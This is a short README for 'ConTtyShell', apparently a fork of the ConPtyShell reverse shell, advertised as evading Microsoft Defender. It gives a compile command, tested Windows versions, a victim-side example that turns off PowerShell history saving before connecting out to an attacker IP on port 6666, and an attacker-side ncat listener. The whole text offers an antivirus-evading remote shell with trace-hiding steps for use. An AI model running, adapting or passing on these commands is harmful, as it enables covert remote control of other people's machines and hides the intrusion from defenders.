# ConTtyShell
ConPtyShell Fork - Evades Microsoft Defender (24/11/2022)

**Original:**

https://github.com/antonioCoco/ConPtyShell

**Compile with:**

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 -nologo -debug -out:ConTtyShell.exe .\ConTtyShell.cs`

**Tested on:**
* Windows Server 2016 Datacenter 10.0 x64 Build 14393
* Windows 10 22H2 x64


**Victim side usage example:**

```
Set-PSReadlineOption -HistorySaveStyle SaveNothing
.\ConTtyShell.exe attacker-ip 6666
```

**Attacker side usage example:**

```
stty raw -echo; (stty size; cat) | ncat -lvnp 6666
```
